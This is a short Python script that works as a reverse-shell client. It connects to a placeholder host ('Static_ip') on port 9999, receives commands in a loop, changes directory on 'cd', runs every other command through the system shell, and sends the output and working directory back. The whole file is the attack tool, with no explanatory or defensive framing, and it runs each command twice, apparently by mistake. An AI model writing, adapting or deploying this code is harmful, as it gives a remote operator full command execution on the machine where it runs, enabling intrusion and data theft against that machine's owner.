import socket
import os
import subprocess

s=socket.socket()
host="Static_ip"
port = 9999
s.connect((host,port))
while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8")=="cd":
        try:
            os.chdir(data[3:].decode("utf-8"))
        except OSError:
            print("error")
            s.send(str.encode('0'))
    if len(data)>0:
        try:
            subprocess.check_call(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        except subprocess.CalledProcessError:
            print("Error")
            s.send(str.encode('0'))
        cmd=subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        output_byte=cmd.stdout.read()+cmd.stderr.read()
        output_str= str(output_byte,"utf-8")
        currentWD=os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))
        print(output_str)
